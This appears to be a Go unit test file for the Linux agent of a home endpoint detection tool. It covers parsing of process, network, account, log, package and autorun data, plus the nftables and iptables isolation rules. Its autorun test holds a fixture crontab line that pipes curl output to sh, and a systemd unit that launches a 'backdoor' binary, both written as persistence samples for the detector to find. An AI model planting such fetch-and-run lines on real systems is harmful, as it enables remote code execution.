//go:build linux

package linux

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"net/netip"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/Doodlebug12/homexdr/agent/internal/platform"
	"github.com/Doodlebug12/homexdr/shared/event"
	"golang.org/x/sys/unix"
)

func TestParseStat(t *testing.T) {
	// comm may contain spaces and ')' — fields are counted from the last ')'.
	line := "4242 (we ird) (name)) S 1 4242 4242 0 -1 4194560 100 0 0 0 1 2 0 0 20 0 1 0 987654 1000 10 18446744073709551615 0 0 0 0 0 0 0 0 0 0 0 0 17 3 0 0 0 0 0\n"
	st, err := parseStat([]byte(line))
	if err != nil {
		t.Fatal(err)
	}
	if st.PID != 4242 || st.Comm != "we ird) (name)" || st.State != 'S' || st.PPID != 1 || st.StartTick != 987654 {
		t.Fatalf("%+v", st)
	}
	if _, err := parseStat([]byte("garbage")); err == nil {
		t.Error("garbage accepted")
	}
}

func TestStartKeyFromNS(t *testing.T) {
	// nsec_to_clock_t with USER_HZ=100 is a floor division by 10ms.
	if StartKeyFromNS(9_999_999) != 0 || StartKeyFromNS(10_000_000) != 1 || StartKeyFromNS(123_456_789_012) != 12345 {
		t.Fatal("StartKeyFromNS")
	}
}

func TestParseStatus(t *testing.T) {
	st := parseStatus([]byte("Name:\tsudo\nTgid:\t77\nUid:\t1000\t0\t0\t0\nGid:\t1000\t1000\t1000\t1000\n"))
	if st.Name != "sudo" || st.TGID != 77 || st.UID != 1000 || st.EUID != 0 || st.GID != 1000 {
		t.Fatalf("%+v", st)
	}
}

func TestParseBootTimeAndMem(t *testing.T) {
	bt, ok := parseBootTime([]byte("cpu  1 2 3\nbtime 1760860800\nprocesses 5\n"))
	if !ok || bt.Unix() != 1760860800 {
		t.Fatal("btime")
	}
	if parseMemTotal([]byte("MemTotal:       32768000 kB\nMemFree: 1 kB\n")) != 32768000*1024 {
		t.Fatal("memtotal")
	}
}

func TestJoinArgs(t *testing.T) {
	if got := joinArgs([]string{"/bin/sh", "-c", "echo hi", ""}); got != `/bin/sh -c "echo hi" ""` {
		t.Fatal(got)
	}
	if got := splitNul([]byte("a\x00b c\x00\x00")); !slices.Equal(got, []string{"a", "b c"}) {
		t.Fatal(got)
	}
}

func TestParseOSRelease(t *testing.T) {
	r := parseOSRelease([]byte("NAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=\"Ubuntu 24.04.3 LTS\"\n"))
	if r.Name != "Ubuntu" || r.VersionID != "24.04" || r.family() != "debian" {
		t.Fatalf("%+v %s", r, r.family())
	}
	if f := parseOSRelease([]byte("ID=rocky\nID_LIKE=\"rhel centos fedora\"\n")).family(); f != "rhel" {
		t.Fatal(f)
	}
	if f := parseOSRelease([]byte("ID=alpine\n")).family(); f != "alpine" {
		t.Fatal(f)
	}
}

func TestParseProcNet(t *testing.T) {
	tcp := `  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 12345 1 0000000000000000 100 0 0 10 0
   1: 0F02000A:A4C2 22D8B85D:01BB 01 00000000:00000000 02:000A3B1E 00000000  1000        0 67890 2 0000000000000000 20 4 30 10 -1
`
	es := parseProcNet([]byte(tcp), "tcp", false)
	if len(es) != 2 {
		t.Fatalf("%d entries", len(es))
	}
	if es[0].Local != netip.MustParseAddrPort("127.0.0.1:8080") || es[0].State != stateListen || es[0].Inode != 12345 || es[0].UID != 1000 {
		t.Fatalf("%+v", es[0])
	}
	if es[1].Local != netip.MustParseAddrPort("10.0.2.15:42178") || es[1].Remote != netip.MustParseAddrPort("93.184.216.34:443") || es[1].State != stateEstablished {
		t.Fatalf("%+v", es[1])
	}
	tcp6 := `  sl  local_address                         remote_address                        st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000000000000000000001000000:0016 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 111 1 0000000000000000 100 0 0 10 0
   1: 0000000000000000FFFF00000100007F:9C40 0000000000000000FFFF00000100007F:1F90 01 00000000:00000000 00:00000000 00000000     0        0 222 1 0000000000000000 100 0 0 10 0
`
	es = parseProcNet([]byte(tcp6), "tcp", true)
	if es[0].Local != netip.MustParseAddrPort("[::1]:22") {
		t.Fatalf("v6 loopback: %v", es[0].Local)
	}
	if es[1].Local != netip.MustParseAddrPort("127.0.0.1:40000") {
		t.Fatalf("v4-mapped should be unmapped: %v", es[1].Local)
	}
}

func TestParsePasswdGroupShadow(t *testing.T) {
	pw := parsePasswd([]byte("root:x:0:0:root:/root:/bin/bash\n# c\nbob:x:1000:1000:Bob,,,:/home/bob:/bin/zsh\nbad:line\n"))
	if len(pw) != 2 || pw[1].Name != "bob" || pw[1].UID != 1000 || pw[1].Shell != "/bin/zsh" {
		t.Fatalf("%+v", pw)
	}
	gs := parseGroup([]byte("sudo:x:27:bob,alice\nbob:x:1000:\n"))
	if len(gs) != 2 || !slices.Equal(gs[0].Members, []string{"bob", "alice"}) || len(gs[1].Members) != 0 {
		t.Fatalf("%+v", gs)
	}
	locked := shadowLocked([]byte("root:!:19000::::::\nbob:$6$abc:19000:0:99999:7:::\nsvc:*:19000::::::\n"))
	if !locked["root"] || locked["bob"] || !locked["svc"] {
		t.Fatalf("%v", locked)
	}
}

func TestParseUtmp(t *testing.T) {
	rec := make([]byte, utmpSize)
	le := binary.LittleEndian
	le.PutUint16(rec[0:], utmpUserProcess)
	le.PutUint32(rec[4:], 1234)
	copy(rec[8:], "pts/0")
	copy(rec[44:], "bob")
	copy(rec[76:], "192.168.1.50")
	le.PutUint32(rec[340:], 1760860800)
	copy(rec[348:], []byte{192, 168, 1, 50})
	es := parseUtmp(append(rec, make([]byte, 10)...))
	if len(es) != 1 {
		t.Fatalf("%d", len(es))
	}
	e := es[0]
	if e.Type != utmpUserProcess || e.PID != 1234 || e.Line != "pts/0" || e.User != "bob" || e.Addr.String() != "192.168.1.50" || e.Time.Unix() != 1760860800 {
		t.Fatalf("%+v", e)
	}
}

func TestDecodeExit(t *testing.T) {
	if c, s := decodeExit(0); c != 0 || s != 0 {
		t.Fatal("exit 0")
	}
	if c, s := decodeExit(3 << 8); c != 3 || s != 0 {
		t.Fatal("exit 3")
	}
	if c, s := decodeExit(9); c != 137 || s != 9 {
		t.Fatal("SIGKILL")
	}
}

func TestParseExecRecord(t *testing.T) {
	b := make([]byte, execEventSize)
	le := binary.NativeEndian
	le.PutUint32(b[0:], evExec)
	le.PutUint32(b[4:], 100)
	le.PutUint32(b[12:], 1)
	le.PutUint32(b[24:], 0)
	args := []byte("/bin/ls\x00-la\x00")
	le.PutUint32(b[28:], uint32(len(args)))
	le.PutUint64(b[32:], 5_000_000_000)
	copy(b[execCommOff:], "ls")
	copy(b[execFilenameOff:], "/bin/ls")
	copy(b[execArgsOff:], args)
	r, err := parseExecRecord(b)
	if err != nil {
		t.Fatal(err)
	}
	if r.PID != 100 || r.PPID != 1 || r.Comm != "ls" || r.Filename != "/bin/ls" || !slices.Equal(r.Args, []string{"/bin/ls", "-la"}) || StartKeyFromNS(r.StartNS) != 500 {
		t.Fatalf("%+v", r)
	}
	if _, err := parseExecRecord(b[:10]); err == nil {
		t.Error("short record accepted")
	}
}

func TestParseProcConn(t *testing.T) {
	le := binary.NativeEndian
	mk := func(what, pid, tgid, code uint32) []byte {
		b := make([]byte, nlmsgHdrLen+cnMsgLen+procEventHdrLen+24)
		le.PutUint32(b[0:], uint32(len(b)))
		le.PutUint32(b[16:], cnIdxProc)
		le.PutUint32(b[20:], cnValProc)
		ev := b[nlmsgHdrLen+cnMsgLen:]
		le.PutUint32(ev[0:], what)
		d := ev[procEventHdrLen:]
		le.PutUint32(d[0:], pid)
		le.PutUint32(d[4:], tgid)
		le.PutUint32(d[8:], code)
		return b
	}
	msgs := parseProcConn(append(mk(procEventExec, 10, 10, 0), mk(procEventExit, 11, 11, 9)...))
	if len(msgs) != 2 || msgs[0].What != procEventExec || msgs[0].TGID != 10 || msgs[1].What != procEventExit || msgs[1].ExitCode != 9 {
		t.Fatalf("%+v", msgs)
	}
	l := listenMsg()
	if le.Uint32(l[0:]) != uint32(len(l)) || le.Uint32(l[16:]) != cnIdxProc || le.Uint32(l[36:]) != procCnMcastListen {
		t.Fatal("listen message layout")
	}
}

func TestParseFanotify(t *testing.T) {
	le := binary.NativeEndian
	handle := []byte{1, 2, 3, 4, 5, 6, 7, 8}
	name := "passwd\x00"
	infoLen := 20 + len(handle) + len(name)
	infoLen = (infoLen + 3) &^ 3
	b := make([]byte, unix.FAN_EVENT_METADATA_LEN+infoLen)
	le.PutUint32(b[0:], uint32(len(b)))
	b[4] = 3
	le.PutUint16(b[6:], unix.FAN_EVENT_METADATA_LEN)
	le.PutUint64(b[8:], unix.FAN_CLOSE_WRITE)
	le.PutUint32(b[16:], 0xffffffff) // FAN_NOFD
	le.PutUint32(b[20:], 4321)
	info := b[unix.FAN_EVENT_METADATA_LEN:]
	info[0] = unix.FAN_EVENT_INFO_TYPE_DFID_NAME
	le.PutUint16(info[2:], uint16(infoLen))
	le.PutUint32(info[4:], 7)
	le.PutUint32(info[8:], 9)
	le.PutUint32(info[12:], uint32(len(handle)))
	le.PutUint32(info[16:], 1)
	copy(info[20:], handle)
	copy(info[20+len(handle):], name)
	evs := parseFanotify(append(b, b...))
	if len(evs) != 2 {
		t.Fatalf("%d events", len(evs))
	}
	e := evs[0]
	if e.mask != unix.FAN_CLOSE_WRITE || e.pid != 4321 || len(e.infos) != 1 {
		t.Fatalf("%+v", e)
	}
	fi := e.infos[0]
	if fi.fsid != [2]int32{7, 9} || fi.htype != 1 || !slices.Equal(fi.handle, handle) || fi.name != "passwd" {
		t.Fatalf("%+v", fi)
	}
}

func TestParseInotify(t *testing.T) {
	le := binary.NativeEndian
	b := make([]byte, unix.SizeofInotifyEvent+16)
	le.PutUint32(b[0:], 5)
	le.PutUint32(b[4:], unix.IN_CREATE)
	le.PutUint32(b[12:], 16)
	copy(b[unix.SizeofInotifyEvent:], "new.txt")
	evs := parseInotify(b)
	if len(evs) != 1 || evs[0].wd != 5 || evs[0].name != "new.txt" || evs[0].mask != unix.IN_CREATE {
		t.Fatalf("%+v", evs)
	}
}

func TestParseAuth(t *testing.T) {
	ts := time.Date(2026, 10, 19, 12, 0, 0, 0, time.UTC)
	cases := []struct {
		app, msg        string
		action, outcome string
		user, target    string
		srcIP           string
		category        string
	}{
		{"sshd", "Accepted publickey for bob from 192.168.1.50 port 51234 ssh2: ED25519 SHA256:abc", "ssh_login", "success", "bob", "", "192.168.1.50", event.CategoryAuthentication},
		{"sshd", "Failed password for invalid user admin from 203.0.113.9 port 4444 ssh2", "ssh_login", "failure", "admin", "", "203.0.113.9", event.CategoryAuthentication},
		{"sshd", "Failed password for root from 203.0.113.9 port 4445 ssh2", "ssh_login", "failure", "root", "", "203.0.113.9", event.CategoryAuthentication},
		{"sshd", "Invalid user oracle from 203.0.113.9 port 4446", "ssh_invalid_user", "failure", "oracle", "", "203.0.113.9", event.CategoryAuthentication},
		{"sudo", "     bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/id", "sudo", "success", "bob", "root", "", event.CategoryAuthentication},
		{"sudo", "    root : PWD=/root ; USER=nobody ; COMMAND=/usr/bin/true", "sudo", "success", "root", "nobody", "", event.CategoryAuthentication},
		{"sudo", "     bob : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/sh", "sudo", "failure", "bob", "root", "", event.CategoryAuthentication},
		{"sudo", "     eve : user NOT in sudoers ; TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/sh", "sudo", "failure", "eve", "root", "", event.CategoryAuthentication},
		{"su", "(to root) bob on pts/0", "su", "success", "bob", "root", "", event.CategoryAuthentication},
		{"su", "FAILED SU (to root) bob on pts/0", "su", "failure", "bob", "root", "", event.CategoryAuthentication},
		{"su", "pam_unix(su:auth): authentication failure; logname=bob uid=1000 euid=0 tty=/dev/pts/0 ruser=bob rhost=  user=root", "su", "failure", "bob", "root", "", event.CategoryAuthentication},
		{"useradd", "new user: name=mallory, UID=1001, GID=1001, home=/home/mallory, shell=/bin/bash, from=/dev/pts/0", "user_created", "success", "", "mallory", "", event.CategoryIAM},
		{"useradd", "new group: name=mallory, GID=1001", "group_created", "success", "", "", "", event.CategoryIAM},
		{"usermod", "add 'mallory' to group 'sudo'", "group_member_added", "success", "", "mallory", "", event.CategoryIAM},
		{"usermod", "change user 'mallory' shell from '/bin/sh' to '/bin/bash'", "user_changed", "success", "", "mallory", "", event.CategoryIAM},
		{"userdel", "delete user 'mallory'", "user_deleted", "success", "", "mallory", "", event.CategoryIAM},
		{"groupdel", "group 'mallory' removed", "group_deleted", "success", "", "", "", event.CategoryIAM},
		{"passwd", "pam_unix(passwd:chauthtok): password changed for bob", "password_changed", "success", "", "bob", "", event.CategoryIAM},
	}
	for _, c := range cases {
		e := parseAuth(authMsg{App: c.app, PID: 99, Msg: c.msg, Time: ts})
		if e == nil {
			t.Errorf("%s %q: not recognized", c.app, c.msg)
			continue
		}
		if e.Event.Action != c.action || e.Event.Outcome != c.outcome || !slices.Contains(e.Event.Category, c.category) || e.Event.Module != event.ModuleAuthLog {
			t.Errorf("%s %q: %s/%s %v", c.app, c.msg, e.Event.Action, e.Event.Outcome, e.Event.Category)
		}
		var user, target string
		if e.User != nil {
			user = e.User.Name
			if e.User.Target != nil {
				target = e.User.Target.Name
			}
		}
		if user != c.user || target != c.target {
			t.Errorf("%s %q: user %q target %q", c.app, c.msg, user, target)
		}
		if c.srcIP != "" && (e.Source == nil || e.Source.IP != c.srcIP) {
			t.Errorf("%s %q: source %+v", c.app, c.msg, e.Source)
		}
		if !e.Timestamp.Equal(ts) || e.Process == nil || e.Process.PID != 99 {
			t.Errorf("%s: timestamp/process not kept", c.app)
		}
	}
	for _, m := range []authMsg{
		{App: "sshd", Msg: "Connection closed by 1.2.3.4 port 22 [preauth]"},
		{App: "sudo", Msg: "pam_unix(sudo:session): session opened for user root(uid=0) by bob(uid=1000)"},
		{App: "CRON", Msg: "pam_unix(cron:session): session opened for user root"},
	} {
		if e := parseAuth(m); e != nil {
			t.Errorf("%q should be ignored, got %s", m.Msg, e.Event.Action)
		}
	}
}

func TestParseJournalLine(t *testing.T) {
	m, cur, ok := parseJournalLine([]byte(`{"__CURSOR":"s=abc;i=1","__REALTIME_TIMESTAMP":"1760860800123456","SYSLOG_IDENTIFIER":"sshd","_PID":"321","MESSAGE":[65,99,99,101,112,116,101,100]}`))
	if !ok || cur != "s=abc;i=1" || m.App != "sshd" || m.PID != 321 || m.Msg != "Accepted" || m.Time.UnixMicro() != 1760860800123456 {
		t.Fatalf("%+v %q", m, cur)
	}
}

func TestParseDpkgAPKPacman(t *testing.T) {
	dpkg := "Package: openssh-server\nStatus: install ok installed\nArchitecture: amd64\nVersion: 1:9.6p1-3ubuntu13\nMaintainer: Ubuntu Developers <ubuntu-devel@lists.ubuntu.com>\nDescription: ssh\n more text\n\nPackage: gone\nStatus: deinstall ok config-files\nVersion: 1\n"
	ps := parseDpkgStatus([]byte(dpkg))
	if len(ps) != 1 || ps[0].Name != "openssh-server" || ps[0].Version != "1:9.6p1-3ubuntu13" || ps[0].Vendor != "Ubuntu Developers" || ps[0].Type != "deb" {
		t.Fatalf("%+v", ps)
	}
	apk := parseAPK([]byte("C:Q1abc\nP:musl\nV:1.2.4-r2\nA:x86_64\nt:1700000000\n\nP:busybox\nV:1.36\n"))
	if len(apk) != 2 || apk[0].Name != "musl" || apk[0].Installed.Unix() != 1700000000 {
		t.Fatalf("%+v", apk)
	}
	pac := parsePacmanDesc([]byte("%NAME%\nbash\n\n%VERSION%\n5.2.026-2\n\n%INSTALLDATE%\n1700000000\n"))
	if pac.Name != "bash" || pac.Version != "5.2.026-2" || pac.Installed.Unix() != 1700000000 {
		t.Fatalf("%+v", pac)
	}
}

func TestAutorunParsers(t *testing.T) {
	sys := parseCrontab([]byte("SHELL=/bin/sh\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n@reboot bob /home/bob/start.sh\n"), true, "")
	if len(sys) != 2 || sys[0][0] != "17 * * * *" || sys[0][1] != "root" || !strings.HasPrefix(sys[0][2], "cd /") || sys[1][0] != "@reboot" || sys[1][1] != "bob" {
		t.Fatalf("%q", sys)
	}
	user := parseCrontab([]byte("*/5 * * * * curl -s http://x | sh\n"), false, "eve")
	if len(user) != 1 || user[0][1] != "eve" || user[0][2] != "curl -s http://x | sh" {
		t.Fatalf("%q", user)
	}
	cmd, u := parseUnit([]byte("[Service]\nExecStart=/usr/bin/backdoor --flag\nUser=nobody\n"))
	if cmd != "/usr/bin/backdoor --flag" || u != "nobody" || commandBinary("-"+cmd) != "/usr/bin/backdoor" {
		t.Fatalf("%q %q", cmd, u)
	}
	exe, on := parseDesktopExec([]byte("[Desktop Entry]\nExec=/opt/x/run\nHidden=true\n"))
	if exe != "/opt/x/run" || on {
		t.Fatalf("%q %v", exe, on)
	}
	blob := []byte("fake-key-blob")
	sum := sha256.Sum256(blob)
	line := `command="/bin/date",no-pty ssh-ed25519 ` + base64.StdEncoding.EncodeToString(blob) + " bob@laptop"
	opts, typ, fp, comment, ok := authorizedKey(line)
	if !ok || opts != `command="/bin/date",no-pty` || typ != "ssh-ed25519" || fp != "SHA256:"+base64.RawStdEncoding.EncodeToString(sum[:]) || comment != "bob@laptop" {
		t.Fatalf("%q %q %q %q %v", opts, typ, fp, comment, ok)
	}
}

func TestSystemctlParsing(t *testing.T) {
	units := parseSystemctlShow([]byte("Id=ssh.service\nDescription=OpenBSD Secure Shell server\nActiveState=active\nSubState=running\nUnitFileState=enabled\nExecStart={ path=/usr/sbin/sshd ; argv[]=/usr/sbin/sshd -D ; ignore_errors=no ; start_time=[n/a] }\nUser=\n\nId=cron.service\nActiveState=inactive\n"))
	if len(units) != 2 || units[0]["Id"] != "ssh.service" || execStartCommand(units[0]["ExecStart"]) != "/usr/sbin/sshd -D" {
		t.Fatalf("%+v", units)
	}
	if startType("enabled") != "auto" || startType("static") != "manual" || startType("masked") != "disabled" {
		t.Fatal("startType")
	}
	u := unitFile("/usr/local/bin/homexdr-agent")
	for _, want := range []string{"ExecStart=/usr/local/bin/homexdr-agent run", "Restart=always", "WantedBy=multi-user.target", "Description=HomeXDR Agent"} {
		if !strings.Contains(u, want) {
			t.Errorf("unit file lacks %q", want)
		}
	}
	if q := systemdQuote("/opt/home xdr/agent"); q != `"/opt/home xdr/agent"` {
		t.Error(q)
	}
}

func TestResolvConf(t *testing.T) {
	got := parseResolvConf([]byte("# x\nnameserver 127.0.0.53\nnameserver 192.168.1.1\nnameserver fe80::1%eth0\nsearch lan\n"))
	want := []netip.Addr{netip.MustParseAddr("127.0.0.53"), netip.MustParseAddr("192.168.1.1"), netip.MustParseAddr("fe80::1")}
	if !slices.Equal(got, want) {
		t.Fatalf("%v", got)
	}
}

func TestNFTRuleset(t *testing.T) {
	iso := platform.Isolation{
		ServerIPs:  []netip.Addr{netip.MustParseAddr("192.168.1.5"), netip.MustParseAddr("fd00::5")},
		ServerPort: 8443,
		Allow:      []netip.Prefix{netip.MustParsePrefix("10.9.0.0/16"), netip.MustParsePrefix("fd00:1::/64")},
	}
	rs := nftRuleset(iso, []netip.Addr{netip.MustParseAddr("192.168.1.1")})
	lines := strings.Split(rs, "\n")
	if lines[0] != "table inet homexdr" || lines[1] != "delete table inet homexdr" {
		t.Fatalf("ruleset must start with an idempotent replace:\n%s", rs)
	}
	for _, want := range []string{
		"type filter hook input priority -10; policy drop;",
		"type filter hook output priority -10; policy drop;",
		"type filter hook forward priority -10; policy drop;",
		`iif "lo" accept`, `oif "lo" accept`,
		"ct state established,related accept",
		"ip daddr { 192.168.1.5 } tcp dport 8443 accept",
		"ip6 daddr { fd00::5 } tcp dport 8443 accept",
		"ip daddr { 192.168.1.1 } meta l4proto { tcp, udp } th dport 53 accept",
		"udp sport 68 udp dport 67 accept",
		"udp sport 67 udp dport 68 accept",
		"ip saddr { 10.9.0.0/16 } accept", "ip daddr { 10.9.0.0/16 } accept",
		"ip6 daddr { fd00:1::/64 } accept",
		"nd-neighbor-solicit",
	} {
		if !strings.Contains(rs, want) {
			t.Errorf("ruleset lacks %q", want)
		}
	}
	// Outbound must not accept established traffic wholesale, so pre-existing
	// connections are cut.
	out := rs[strings.Index(rs, "chain output"):strings.Index(rs, "chain forward")]
	if strings.Contains(out, "ct state") {
		t.Error("output chain accepts established connections")
	}
	// No empty sets (nft rejects them).
	if strings.Contains(rs, "{  }") {
		t.Error("empty set rendered")
	}
	min := nftRuleset(platform.Isolation{ServerIPs: []netip.Addr{netip.MustParseAddr("10.0.0.1")}, ServerPort: 443}, nil)
	if strings.Contains(min, "ip6 daddr") || strings.Contains(min, "th dport 53") {
		t.Errorf("unused families rendered:\n%s", min)
	}
}

func TestIPTRules(t *testing.T) {
	iso := platform.Isolation{ServerIPs: []netip.Addr{netip.MustParseAddr("192.168.1.5")}, ServerPort: 8443, Allow: []netip.Prefix{netip.MustParsePrefix("10.0.0.0/8")}}
	rules := iptRules(false, iso, []netip.Addr{netip.MustParseAddr("192.168.1.1")})
	joined := make([]string, len(rules))
	for i, r := range rules {
		joined[i] = strings.Join(r, " ")
	}
	all := strings.Join(joined, "\n")
	for _, want := range []string{
		"-A HOMEXDR-OUT -d 192.168.1.5 -p tcp --dport 8443 -j ACCEPT",
		"-A HOMEXDR-OUT -d 192.168.1.1 -p udp --dport 53 -j ACCEPT",
		"-A HOMEXDR-IN -s 10.0.0.0/8 -j ACCEPT",
		"-A HOMEXDR-IN -j DROP", "-A HOMEXDR-OUT -j DROP", "-A HOMEXDR-FWD -j DROP",
	} {
		if !strings.Contains(all, want) {
			t.Errorf("missing %q in\n%s", want, all)
		}
	}
	if last := joined[len(joined)-1]; last != "-A HOMEXDR-FWD -j DROP" {
		t.Errorf("last rule %q", last)
	}
	v6 := iptRules(true, iso, nil)
	for _, r := range v6 {
		if slices.Contains(r, "192.168.1.5") {
			t.Error("IPv4 server in IPv6 rules")
		}
	}
}
